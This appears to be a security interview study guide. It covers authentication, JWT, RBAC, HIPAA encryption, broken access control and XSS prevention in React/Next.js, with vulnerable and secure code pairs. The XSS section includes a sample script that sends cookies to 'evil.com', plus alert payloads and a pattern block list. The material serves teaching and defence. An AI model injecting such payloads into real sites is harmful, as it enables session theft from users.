# Security Interview Questions & Answers

## Table of Contents

### Authentication & Authorization
1. [What is the difference between authentication and authorization?](#q1-what-is-the-difference-between-authentication-and-authorization)
2. [What is the difference between JWT and sessions/cookies?](#q2-what-is-the-difference-between-jwt-and-sessionscookies)
3. [What is Role-Based Access Control (RBAC)?](#q3-what-is-role-based-access-control-rbac)

### Input Security
4. [What is the difference between validation and sanitization?](#q4-what-is-the-difference-between-validation-and-sanitization)

### Compliance & Logging
5. [How do you encrypt data for HIPAA compliance?](#q5-how-do-you-encrypt-data-for-hipaa-compliance)
6. [What is Audit Logging and why is it required for HIPAA?](#q6-what-is-audit-logging-and-why-is-it-required-for-hipaa)

### Vulnerabilities & Prevention
7. [What is Broken Access Control and how do you prevent it?](#q7-what-is-broken-access-control-and-how-do-you-prevent-it)
8. [How does JWT authentication work and what are the security considerations?](#q8-how-does-jwt-authentication-work-and-what-are-the-security-considerations)
9. [What is XSS and how do you prevent it in React/Next.js?](#q9-what-is-xss-and-how-do-you-prevent-it-in-reactnextjs)
10. [What is the difference between Cookies, Sessions, and JWT tokens?](#q10-what-is-the-difference-between-cookies-sessions-and-jwt-tokens)

---

## Q1. What is the difference between authentication and authorization?

### Concept:

- **Authentication:** Verifying who the user is
- **Authorization:** Determining what the user can access

### Flow (JWT Example):

1. User logs in → Server verifies credentials → Issues JWT
2. User requests resource → Server checks JWT (authentication)
3. Server checks user's role/permissions (authorization)

### Code Example:

```typescript
// Authentication middleware
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "No token" });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: "Invalid token" });
  }
}

// Authorization middleware
function authorize(roles: string[]) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: "Forbidden" });
    }
    next();
  };
}
```

### Analogy:

- **Authentication** → Showing ID at building entrance
- **Authorization** → Keycard that opens only specific floors

### ⚡ One-liner to remember:
> Authentication = "Who are you?" Authorization = "What can you do?"

---

## Q2. What is the difference between JWT and sessions/cookies?

### Concept:

| Feature     | JWT                    | Session + Cookie          |
|-------------|------------------------|---------------------------|
| State       | Stateless              | Stateful                  |
| Storage     | Client-side            | Server-side               |
| Scalability | Easy to scale          | Needs shared storage      |
| Use case    | APIs, microservices    | Traditional web apps      |

### JWT Example:

```typescript
// Create token
const token = jwt.sign({ userId: 1, role: "admin" }, SECRET, { expiresIn: "1h" });

// Verify token
const decoded = jwt.verify(token, SECRET);
```

### Session Example:

```typescript
// Set session
req.session.userId = user.id;

// Check session
if (!req.session.userId) return res.status(401).send("Unauthorized");
```

### Analogy:

- **JWT** → Sealed envelope with your info (self-contained)
- **Session** → Numbered ticket, server keeps your info

### ⚡ One-liner to remember:
> JWT = stateless token. Session = stateful server storage.

---

## Q3. What is Role-Based Access Control (RBAC)?

### Concept:

RBAC restricts access based on **user roles**, not individual users. Users are assigned roles, and roles have permissions.

### Healthcare Example:

| Role    | Permissions                     |
|---------|--------------------------------|
| Doctor  | Read & update patient records  |
| Nurse   | Read patient data only         |
| Billing | Access billing info only       |
| Admin   | Manage users (no PHI access)   |

### Implementation:

```typescript
enum Role {
  DOCTOR = "doctor",
  NURSE = "nurse",
  BILLING = "billing",
  ADMIN = "admin"
}

const permissions = {
  doctor: ["READ_PATIENT", "UPDATE_PATIENT"],
  nurse: ["READ_PATIENT"],
  billing: ["READ_BILLING"],
  admin: ["MANAGE_USERS"]
};

function hasPermission(role: Role, permission: string): boolean {
  return permissions[role]?.includes(permission) ?? false;
}

// Usage
if (!hasPermission(user.role, "READ_PATIENT")) {
  throw new Error("Access denied");
}
```

### Middleware:

```typescript
function requirePermission(permission: string) {
  return (req, res, next) => {
    if (!hasPermission(req.user.role, permission)) {
      return res.status(403).json({ error: "Forbidden" });
    }
    next();
  };
}

app.get("/patients", authenticate, requirePermission("READ_PATIENT"), getPatients);
```

### Analogy:

Think of a **hospital**:
- Doctors wear white coats (role) → access to patient rooms
- Janitors wear uniforms (role) → access to supply closets
- The badge (role) determines which doors open

### ⚡ One-liner to remember:
> RBAC = Assign roles to users, permissions to roles.

---

## Q4. What is the difference between validation and sanitization?

### Concept:

- **Validation:** Checks if input is allowed, rejects if invalid
- **Sanitization:** Cleans input to make it safe

**Rule:** Validate first, sanitize second.

### Examples:

```typescript
// Validation - reject bad input
function validateEmail(email: string): boolean {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Sanitization - clean input
function sanitizeEmail(email: string): string {
  return email.trim().toLowerCase();
}
```

### XSS Protection:

```typescript
import DOMPurify from "dompurify";
const safeHTML = DOMPurify.sanitize(userInput);
```

### SQL Injection Protection:

```typescript
// Parameterized query (sanitized)
db.query("SELECT * FROM users WHERE id = ?", [userId]);
```

### Comparison:

| Aspect   | Validation           | Sanitization            |
|----------|----------------------|-------------------------|
| Action   | Rejects bad input    | Cleans unsafe input     |
| Protects | Application logic    | Security                |
| When     | On input             | Before storage/output   |

### Analogy:

Think of an **airport**:
- **Validation** → Check-in verifies ticket (reject if invalid)
- **Sanitization** → Security removes dangerous items

### ⚡ One-liner to remember:
> Validation = reject bad input. Sanitization = clean dangerous input.

---

## Q5. How do you encrypt data for HIPAA compliance?

### Concept:

HIPAA requires encrypting PHI (Protected Health Information):

- **At rest:** AES-256 for stored data
- **In transit:** TLS 1.3 for network data

### At Rest (AES-256):

```typescript
import crypto from "crypto";

const algorithm = "aes-256-gcm";
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(16);

function encrypt(text: string): string {
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  return cipher.update(text, "utf8", "hex") + cipher.final("hex");
}
```

### In Transit (TLS 1.3):

```typescript
import https from "https";

https.createServer({
  key: fs.readFileSync("private-key.pem"),
  cert: fs.readFileSync("certificate.pem"),
  minVersion: "TLSv1.3"
}, app).listen(443);
```

### Comparison:

| Type       | Method   | Protects                  |
|------------|----------|---------------------------|
| At rest    | AES-256  | Database, files, backups  |
| In transit | TLS 1.3  | API calls, file transfers |

### Analogy:

- **At rest** → Files locked in a safe
- **In transit** → Armored vehicle transporting files

### ⚡ One-liner to remember:
> HIPAA = AES-256 for storage, TLS 1.3 for transport.

---

## Q6. What is Audit Logging and why is it required for HIPAA?

### Concept:

Audit logging records **every access to sensitive data** for accountability and breach detection. HIPAA mandates tracking:

- **Who** accessed data
- **What** data was accessed
- **When** it was accessed
- **What action** was performed

### Database Schema:

```sql
CREATE TABLE audit_logs (
  id SERIAL PRIMARY KEY,
  user_id INT,
  role TEXT,
  action TEXT,
  resource TEXT,
  timestamp TIMESTAMP DEFAULT NOW(),
  ip_address TEXT
);
```

### Logging Function:

```typescript
async function logAudit(params: {
  userId: number;
  role: string;
  action: string;
  resource: string;
  ip: string;
}) {
  await db.query(
    `INSERT INTO audit_logs (user_id, role, action, resource, ip_address)
     VALUES (?, ?, ?, ?, ?)`,
    [params.userId, params.role, params.action, params.resource, params.ip]
  );
}
```

### Usage with RBAC:

```typescript
app.get("/patients/:id", authenticate, async (req, res) => {
  if (!hasPermission(req.user.role, "READ_PATIENT")) {
    return res.status(403).json({ error: "Forbidden" });
  }

  await logAudit({
    userId: req.user.id,
    role: req.user.role,
    action: "READ",
    resource: `PATIENT:${req.params.id}`,
    ip: req.ip
  });

  // Return patient data...
});
```

### HIPAA Requirements Met:

| Requirement      | How It's Satisfied          |
|------------------|-----------------------------|
| Access Control   | RBAC limits by role         |
| Audit Controls   | Immutable logs              |
| Accountability   | Every action traceable      |
| Breach Detection | Monitor for anomalies       |

### Best Practices:

- Make logs **append-only** (no edits/deletes)
- Encrypt logs at rest
- Set retention period (HIPAA: 6 years)
- Monitor for suspicious patterns

### Analogy:

Think of a **bank vault**:
- Security cameras record every entry (who, when)
- Access logs track which boxes were opened
- Cannot delete footage (immutable)

### ⚡ One-liner to remember:
> Audit logging = Record every PHI access for accountability and compliance.

---

## Q7. What is Broken Access Control and how do you prevent it?

### Concept:

Broken Access Control occurs when users can **access resources or perform actions they shouldn't be allowed to**. It's the **#1 vulnerability** in OWASP Top 10 2021.

### Common Broken Access Control Vulnerabilities:

#### 1. Insecure Direct Object Reference (IDOR)

**Vulnerable code:**
```typescript
// User can access ANY user's data by changing the ID
app.get("/api/users/:id", (req, res) => {
  const user = await db.query("SELECT * FROM users WHERE id = ?", [req.params.id]);
  res.json(user); // ❌ No authorization check!
});

// Attacker: GET /api/users/999 → Gets someone else's data
```

**Secure code:**
```typescript
app.get("/api/users/:id", authenticate, (req, res) => {
  const requestedId = req.params.id;

  // ✅ Check if user can access this resource
  if (req.user.id !== requestedId && req.user.role !== "admin") {
    return res.status(403).json({ error: "Forbidden" });
  }

  const user = await db.query("SELECT * FROM users WHERE id = ?", [requestedId]);
  res.json(user);
});
```

#### 2. Missing Function-Level Access Control

**Vulnerable code:**
```typescript
// Admin function with no authorization check
app.delete("/api/users/:id", async (req, res) => {
  await db.query("DELETE FROM users WHERE id = ?", [req.params.id]);
  res.json({ success: true }); // ❌ Anyone can delete users!
});
```

**Secure code:**
```typescript
app.delete("/api/users/:id", authenticate, requireRole("admin"), async (req, res) => {
  // ✅ Only admins can delete users
  await db.query("DELETE FROM users WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

function requireRole(role: string) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ error: "Forbidden" });
    }
    next();
  };
}
```

#### 3. Client-Side Access Control

**Vulnerable code:**
```typescript
// Checking role on frontend only
function AdminPanel() {
  const user = useAuth();

  // ❌ Attacker can bypass by modifying client code
  if (user.role !== "admin") return null;

  return <button onClick={deleteAllUsers}>Delete All Users</button>;
}
```

**Secure code:**
```typescript
// Frontend + Backend check
function AdminPanel() {
  const user = useAuth();

  // Frontend check for UX only
  if (user.role !== "admin") return null;

  return <button onClick={deleteAllUsers}>Delete All Users</button>;
}

// ✅ Real security on backend
app.delete("/api/users", authenticate, requireRole("admin"), async (req, res) => {
  // Backend enforces the rule
  await db.query("DELETE FROM users");
  res.json({ success: true });
});
```

#### 4. Vertical Privilege Escalation

**Vulnerable code:**
```typescript
// User can promote themselves to admin
app.patch("/api/users/:id", authenticate, async (req, res) => {
  // ❌ User can set their own role to "admin"
  await db.query("UPDATE users SET role = ? WHERE id = ?",
    [req.body.role, req.params.id]);
  res.json({ success: true });
});
```

**Secure code:**
```typescript
app.patch("/api/users/:id", authenticate, async (req, res) => {
  const { name, email } = req.body; // ✅ Only allow safe fields

  // Role changes require admin privilege
  if (req.body.role && req.user.role !== "admin") {
    return res.status(403).json({ error: "Cannot change role" });
  }

  await db.query("UPDATE users SET name = ?, email = ? WHERE id = ?",
    [name, email, req.params.id]);
  res.json({ success: true });
});
```

#### 5. Horizontal Privilege Escalation

**Vulnerable code:**
```typescript
// User can view/edit other users' orders
app.get("/api/orders/:orderId", authenticate, async (req, res) => {
  const order = await db.query("SELECT * FROM orders WHERE id = ?",
    [req.params.orderId]);
  res.json(order); // ❌ No check if order belongs to user
});
```

**Secure code:**
```typescript
app.get("/api/orders/:orderId", authenticate, async (req, res) => {
  const order = await db.query(
    "SELECT * FROM orders WHERE id = ? AND user_id = ?",
    [req.params.orderId, req.user.id] // ✅ Filter by user_id
  );

  if (!order) {
    return res.status(404).json({ error: "Order not found" });
  }

  res.json(order);
});
```

### Prevention Strategies:

| Strategy | Implementation |
|----------|----------------|
| **Deny by default** | Require explicit permission for every action |
| **Server-side enforcement** | Never trust client-side checks |
| **Principle of least privilege** | Grant minimum necessary permissions |
| **Object-level checks** | Verify ownership before access |
| **Function-level checks** | Verify role before sensitive operations |
| **Audit logging** | Track all access attempts |

### Complete Prevention Example:

```typescript
// Middleware stack
app.get("/api/documents/:id",
  authenticate,                    // Who are you?
  checkOwnership("document"),      // Do you own this resource?
  requirePermission("READ_DOC"),   // Do you have permission?
  logAccess,                       // Log the access
  getDocument                      // Finally, get the resource
);

// Ownership check middleware
function checkOwnership(resourceType: string) {
  return async (req, res, next) => {
    const resource = await db.query(
      `SELECT user_id FROM ${resourceType}s WHERE id = ?`,
      [req.params.id]
    );

    if (!resource || resource.user_id !== req.user.id) {
      if (req.user.role !== "admin") {
        return res.status(403).json({ error: "Forbidden" });
      }
    }

    next();
  };
}

// Permission check middleware
function requirePermission(permission: string) {
  return (req, res, next) => {
    if (!hasPermission(req.user.role, permission)) {
      return res.status(403).json({ error: "Insufficient permissions" });
    }
    next();
  };
}

// Access logging middleware
async function logAccess(req, res, next) {
  await db.query(
    `INSERT INTO access_logs (user_id, resource, action, timestamp)
     VALUES (?, ?, ?, NOW())`,
    [req.user.id, req.path, req.method]
  );
  next();
}
```

### Testing for Broken Access Control:

```typescript
// Test: User cannot access other user's data
describe("Access Control", () => {
  it("should prevent user from accessing others' orders", async () => {
    const response = await request(app)
      .get("/api/orders/999") // Order belongs to another user
      .set("Authorization", `Bearer ${userToken}`);

    expect(response.status).toBe(403);
  });

  it("should prevent non-admin from deleting users", async () => {
    const response = await request(app)
      .delete("/api/users/123")
      .set("Authorization", `Bearer ${userToken}`);

    expect(response.status).toBe(403);
  });
});
```

### Common Attack Scenarios:

| Attack | Example | Prevention |
|--------|---------|------------|
| IDOR | Change URL: `/user/123` → `/user/124` | Check ownership |
| Parameter tampering | `{"userId": 123, "role": "admin"}` | Whitelist allowed fields |
| JWT manipulation | Modify token payload | Verify signature |
| Forced browsing | Access `/admin` without login | Require authentication |
| Missing checks | API has no auth middleware | Default deny policy |

### Analogy:

Think of a **hotel**:
- **Broken Access Control** = Your room key opens other guests' rooms
- **Proper Access Control** = Your key only opens YOUR room, staff keys open all rooms
- **Audit Logging** = Security cameras record who enters each room

### ⚡ One-liner to remember:
> Broken Access Control = Users accessing resources they shouldn't. Prevent with server-side ownership and permission checks.

---

## Q8. How does JWT authentication work and what are the security considerations?

### Concept:

JWT (JSON Web Token) is a **stateless, self-contained token** used for authentication. It contains encoded user information and a signature to prevent tampering.

### JWT Structure:

A JWT has 3 parts separated by dots (`.`):

```
header.payload.signature
```

**Example JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiZW1haWwiOiJ1c2VyQGV4YW1wbGUuY29tIiwiaWF0IjoxNjg5MzQwMDAwLCJleHAiOjE2ODkzNDM2MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

#### 1. Header
```json
{
  "alg": "HS256",  // Algorithm
  "typ": "JWT"     // Type
}
```

#### 2. Payload (Claims)
```json
{
  "userId": 123,
  "email": "user@example.com",
  "role": "admin",
  "iat": 1689340000,  // Issued at
  "exp": 1689343600   // Expiration
}
```

#### 3. Signature
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### How JWT Authentication Works:

**1. User Login:**
```typescript
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  // Verify credentials
  const user = await db.query("SELECT * FROM users WHERE email = ?", [email]);
  const isValid = await bcrypt.compare(password, user.passwordHash);

  if (!isValid) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Create JWT
  const token = jwt.sign(
    {
      userId: user.id,
      email: user.email,
      role: user.role
    },
    process.env.JWT_SECRET,
    { expiresIn: "1h" }
  );

  res.json({ token });
});
```

**2. Client Stores Token:**
```typescript
// Store in localStorage or cookie
localStorage.setItem("token", token);

// Or in httpOnly cookie (more secure)
res.cookie("token", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 3600000
});
```

**3. Client Sends Token with Requests:**
```typescript
// Send in Authorization header
fetch("/api/profile", {
  headers: {
    "Authorization": `Bearer ${token}`
  }
});
```

**4. Server Verifies Token:**
```typescript
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];

  if (!token) {
    return res.status(401).json({ error: "No token provided" });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;  // Attach user info to request
    next();
  } catch (error) {
    return res.status(401).json({ error: "Invalid token" });
  }
}

// Use middleware
app.get("/api/profile", authenticate, (req, res) => {
  res.json({ user: req.user });
});
```

### Security Considerations:

#### 1. **Algorithm Confusion Attack**

**Vulnerable:**
```typescript
// Accepting any algorithm from the token header
const decoded = jwt.verify(token, secret);  // ❌ Dangerous
```

**Secure:**
```typescript
// Always specify allowed algorithms
const decoded = jwt.verify(token, secret, {
  algorithms: ["HS256"]  // ✅ Whitelist algorithms
});
```

**Attack scenario:** Attacker changes algorithm from `HS256` to `none`, removing signature requirement.

#### 2. **Secret Key Security**

**Bad practices:**
```typescript
const secret = "mysecret";  // ❌ Weak secret
const secret = "secret123"; // ❌ Hardcoded
```

**Best practices:**
```typescript
// ✅ Use strong, random secret from environment
const secret = process.env.JWT_SECRET;  // 256+ bits random

// Generate strong secret (one time):
// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

#### 3. **Token Storage**

| Storage Location | Security Risk | Recommendation |
|------------------|---------------|----------------|
| localStorage | XSS vulnerable | ❌ Avoid for sensitive apps |
| sessionStorage | XSS vulnerable | ❌ Avoid for sensitive apps |
| httpOnly Cookie | XSS safe, CSRF vulnerable | ✅ Best option + CSRF protection |
| Memory only | Lost on refresh | ⚠️ Use with refresh tokens |

**Secure storage:**
```typescript
// Server sets httpOnly cookie
res.cookie("token", token, {
  httpOnly: true,    // ✅ Not accessible via JavaScript
  secure: true,      // ✅ Only sent over HTTPS
  sameSite: "strict", // ✅ CSRF protection
  maxAge: 3600000    // 1 hour
});
```

#### 4. **Token Expiration**

**Bad:**
```typescript
const token = jwt.sign(payload, secret);  // ❌ Never expires
```

**Good:**
```typescript
const token = jwt.sign(payload, secret, {
  expiresIn: "15m"  // ✅ Short-lived access token
});

const refreshToken = jwt.sign(payload, refreshSecret, {
  expiresIn: "7d"   // ✅ Longer-lived refresh token
});
```

#### 5. **Refresh Token Pattern**

```typescript
// Login returns both tokens
app.post("/login", async (req, res) => {
  // ... verify credentials ...

  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: "15m" }
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_SECRET,
    { expiresIn: "7d" }
  );

  // Store refresh token in database
  await db.query(
    "INSERT INTO refresh_tokens (user_id, token) VALUES (?, ?)",
    [user.id, refreshToken]
  );

  res.json({ accessToken, refreshToken });
});

// Refresh endpoint
app.post("/refresh", async (req, res) => {
  const { refreshToken } = req.body;

  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);

    // Check if refresh token exists in DB
    const exists = await db.query(
      "SELECT * FROM refresh_tokens WHERE token = ?",
      [refreshToken]
    );

    if (!exists) {
      return res.status(401).json({ error: "Invalid refresh token" });
    }

    // Issue new access token
    const accessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET,
      { expiresIn: "15m" }
    );

    res.json({ accessToken });
  } catch (error) {
    return res.status(401).json({ error: "Invalid refresh token" });
  }
});
```

#### 6. **Sensitive Data in Payload**

**Bad:**
```typescript
const token = jwt.sign({
  userId: 123,
  password: "secret123",        // ❌ Never include passwords
  ssn: "123-45-6789",          // ❌ No PII
  creditCard: "4111-1111-1111" // ❌ No sensitive data
}, secret);
```

**Good:**
```typescript
const token = jwt.sign({
  userId: 123,        // ✅ Non-sensitive identifiers only
  role: "user",       // ✅ Permissions
  email: "user@example.com"  // ✅ Non-sensitive info
}, secret);
```

**Note:** JWT payload is only **encoded**, not encrypted. Anyone can decode it.

#### 7. **Token Revocation**

**Problem:** JWTs can't be invalidated until expiration.

**Solutions:**

**Option 1: Blacklist (for logout):**
```typescript
// Store revoked tokens in Redis with TTL
app.post("/logout", authenticate, async (req, res) => {
  const token = req.headers.authorization.split(" ")[1];
  const decoded = jwt.decode(token);
  const ttl = decoded.exp - Math.floor(Date.now() / 1000);

  // Add to blacklist
  await redis.setex(`blacklist:${token}`, ttl, "revoked");
  res.json({ message: "Logged out" });
});

// Check blacklist in middleware
async function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];

  // Check if token is blacklisted
  const isBlacklisted = await redis.get(`blacklist:${token}`);
  if (isBlacklisted) {
    return res.status(401).json({ error: "Token revoked" });
  }

  // ... rest of verification ...
}
```

**Option 2: Token versioning:**
```typescript
// Store token version in user table
const token = jwt.sign({
  userId: user.id,
  tokenVersion: user.tokenVersion  // Increment on password change/logout
}, secret);

// Verify version matches
function authenticate(req, res, next) {
  const decoded = jwt.verify(token, secret);
  const user = await db.query("SELECT tokenVersion FROM users WHERE id = ?", [decoded.userId]);

  if (decoded.tokenVersion !== user.tokenVersion) {
    return res.status(401).json({ error: "Token invalidated" });
  }
  // ...
}
```

### Complete Secure Implementation:

```typescript
import jwt from "jsonwebtoken";
import bcrypt from "bcrypt";

// Login
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const user = await db.query("SELECT * FROM users WHERE email = ?", [email]);
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: "15m", algorithm: "HS256" }
  );

  res.cookie("accessToken", accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    maxAge: 900000  // 15 minutes
  });

  res.json({ message: "Logged in" });
});

// Auth middleware
function authenticate(req, res, next) {
  const token = req.cookies.accessToken;

  if (!token) {
    return res.status(401).json({ error: "No token" });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ["HS256"]
    });
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({ error: "Token expired" });
    }
    return res.status(401).json({ error: "Invalid token" });
  }
}

// Protected route
app.get("/api/profile", authenticate, (req, res) => {
  res.json({ user: req.user });
});

// Logout
app.post("/logout", (req, res) => {
  res.clearCookie("accessToken");
  res.json({ message: "Logged out" });
});
```

### Security Checklist:

- [ ] Use strong, random secret (256+ bits)
- [ ] Store secret in environment variables
- [ ] Specify allowed algorithms explicitly
- [ ] Set short expiration (15-30 min)
- [ ] Use refresh tokens for longer sessions
- [ ] Store tokens in httpOnly cookies (not localStorage)
- [ ] Enable HTTPS in production
- [ ] Don't put sensitive data in payload
- [ ] Implement token revocation strategy
- [ ] Validate token on every request
- [ ] Use CSRF protection with cookies

### Analogy:

Think of a **concert wristband**:
- **JWT** = Tamper-proof wristband with your info printed on it
- **Signature** = Special hologram that proves it's authentic
- **Expiration** = Wristband only valid for today's concert
- **Payload** = Your name and ticket type (visible to everyone)
- **Secret** = Special ink only organizers can verify

### ⚡ One-liner to remember:
> JWT = Stateless token with signature. Keep secrets strong, tokens short-lived, and never store sensitive data in payload.

---

## Q9. What is XSS and how do you prevent it in React/Next.js?

### Concept:

XSS (Cross-Site Scripting) is an attack where malicious JavaScript code is injected into a web application and executed in victims' browsers.

### Types of XSS:

| Type | Description | Example |
|------|-------------|---------|
| **Stored XSS** | Malicious script stored in database | Comment with `<script>` tag |
| **Reflected XSS** | Script in URL reflected back | `/search?q=<script>alert(1)</script>` |
| **DOM-based XSS** | Client-side JavaScript vulnerability | `innerHTML = userInput` |

### How XSS Works:

```
1. Attacker injects: <script>fetch('evil.com?cookie='+document.cookie)</script>
2. Victim views page with injected code
3. Script executes in victim's browser
4. Attacker steals cookies, session tokens, or performs actions
```

### React's Built-in Protection:

React **automatically escapes** values in JSX, providing XSS protection by default:

```tsx
// ✅ SAFE - React escapes the value
function UserProfile({ name }) {
  return <div>Hello, {name}</div>;
}

// If name = "<script>alert('XSS')</script>"
// Rendered as: Hello, &lt;script&gt;alert('XSS')&lt;/script&gt;
// The script tags are escaped, not executed
```

### Dangerous Patterns (How to Break React's Protection):

#### 1. **dangerouslySetInnerHTML** (Most Common)

**Vulnerable:**
```tsx
function Comment({ comment }) {
  // ❌ DANGEROUS - Executes any script in comment
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}

// If comment = "<img src=x onerror='alert(1)'>"
// Script will execute!
```

**Safe:**
```tsx
import DOMPurify from "dompurify";

function Comment({ comment }) {
  // ✅ SAFE - Sanitize before rendering
  const clean = DOMPurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

#### 2. **Direct DOM Manipulation**

**Vulnerable:**
```tsx
function SearchResults({ query }) {
  useEffect(() => {
    // ❌ DANGEROUS
    document.getElementById("result").innerHTML = query;
  }, [query]);

  return <div id="result" />;
}
```

**Safe:**
```tsx
function SearchResults({ query }) {
  // ✅ SAFE - Use React's rendering
  return <div>{query}</div>;
}
```

#### 3. **href with javascript: protocol**

**Vulnerable:**
```tsx
function Link({ url }) {
  // ❌ DANGEROUS - Allows javascript: URLs
  return <a href={url}>Click me</a>;
}

// If url = "javascript:alert('XSS')"
// Script executes on click
```

**Safe:**
```tsx
function Link({ url }) {
  // ✅ SAFE - Validate protocol
  const isValidUrl = url.startsWith("http://") || url.startsWith("https://");

  if (!isValidUrl) {
    return <span>Invalid URL</span>;
  }

  return <a href={url}>Click me</a>;
}

// Or use URL validation
function isValidUrl(string: string) {
  try {
    const url = new URL(string);
    return url.protocol === "http:" || url.protocol === "https:";
  } catch {
    return false;
  }
}
```

#### 4. **User-Controlled Styles**

**Vulnerable:**
```tsx
function CustomDiv({ style }) {
  // ❌ DANGEROUS - Can inject malicious CSS
  return <div style={{ ...style }} />;
}

// If style = { background: "url('javascript:alert(1)')" }
```

**Safe:**
```tsx
function CustomDiv({ backgroundColor, color }) {
  // ✅ SAFE - Only allow specific properties
  return <div style={{ backgroundColor, color }} />;
}
```

### Next.js Specific Protections:

#### 1. **Server Components (App Router)**

```tsx
// app/post/[id]/page.tsx
async function Post({ params }) {
  const post = await db.posts.findOne({ id: params.id });

  // ✅ SAFE - Server Components auto-escape
  return (
    <div>
      <h1>{post.title}</h1>
      <p>{post.content}</p>
    </div>
  );
}
```

#### 2. **Sanitize in API Routes**

```tsx
// app/api/comments/route.ts
import { NextRequest, NextResponse } from "next/server";
import DOMPurify from "isomorphic-dompurify";

export async function POST(req: NextRequest) {
  const { comment } = await req.json();

  // ✅ Sanitize before storing
  const clean = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ["b", "i", "em", "strong"],
    ALLOWED_ATTR: []
  });

  await db.comments.create({ content: clean });

  return NextResponse.json({ success: true });
}
```

#### 3. **Content Security Policy (CSP)**

```tsx
// next.config.js
const securityHeaders = [
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval' 'unsafe-inline'",  // Be more restrictive in production
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self' data:",
      "connect-src 'self'",
      "frame-ancestors 'none'"
    ].join("; ")
  },
  {
    key: "X-Content-Type-Options",
    value: "nosniff"
  },
  {
    key: "X-Frame-Options",
    value: "DENY"
  },
  {
    key: "X-XSS-Protection",
    value: "1; mode=block"
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: securityHeaders
      }
    ];
  }
};
```

#### 4. **Middleware for Input Sanitization**

```tsx
// middleware.ts
import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

export function middleware(request: NextRequest) {
  const url = request.nextUrl.clone();

  // Check for XSS patterns in query params
  const dangerousPatterns = [
    /<script/i,
    /javascript:/i,
    /onerror=/i,
    /onclick=/i
  ];

  const queryString = url.search;

  for (const pattern of dangerousPatterns) {
    if (pattern.test(queryString)) {
      // Block suspicious requests
      return new NextResponse("Invalid request", { status: 400 });
    }
  }

  return NextResponse.next();
}
```

### Complete Safe Implementation:

```tsx
// components/RichTextEditor.tsx
import { useState } from "react";
import DOMPurify from "isomorphic-dompurify";

interface RichTextEditorProps {
  initialContent: string;
  onSave: (content: string) => void;
}

export function RichTextEditor({ initialContent, onSave }: RichTextEditorProps) {
  const [content, setContent] = useState(initialContent);

  const handleSave = () => {
    // ✅ Sanitize before saving
    const clean = DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li"],
      ALLOWED_ATTR: ["href", "target"],
      ALLOWED_URI_REGEXP: /^https?:\/\//  // Only allow http(s) URLs
    });

    onSave(clean);
  };

  return (
    <div>
      <textarea
        value={content}
        onChange={(e) => setContent(e.target.value)}
      />
      <button onClick={handleSave}>Save</button>
    </div>
  );
}

// components/SafeHtmlRenderer.tsx
interface SafeHtmlRendererProps {
  html: string;
}

export function SafeHtmlRenderer({ html }: SafeHtmlRendererProps) {
  // ✅ Sanitize on render
  const clean = DOMPurify.sanitize(html);

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Usage in Next.js page
// app/post/[id]/page.tsx
import { SafeHtmlRenderer } from "@/components/SafeHtmlRenderer";

async function Post({ params }) {
  const post = await db.posts.findOne({ id: params.id });

  return (
    <div>
      <h1>{post.title}</h1>
      {/* ✅ Safe rendering of user content */}
      <SafeHtmlRenderer html={post.content} />
    </div>
  );
}
```

### Prevention Strategies:

| Strategy | Implementation | Protection Level |
|----------|----------------|------------------|
| **Use React's JSX** | Always render with `{value}` | ✅ High |
| **Avoid dangerouslySetInnerHTML** | Only use when necessary | ⚠️ Requires sanitization |
| **Sanitize HTML** | Use DOMPurify | ✅ High |
| **Validate URLs** | Check protocol before rendering | ✅ Medium |
| **CSP Headers** | Restrict script sources | ✅ High |
| **Input validation** | Validate on backend | ✅ High |
| **Escape user data** | Use libraries | ✅ High |

### Common XSS Payloads to Test:

```html
<!-- Basic script injection -->
<script>alert('XSS')</script>

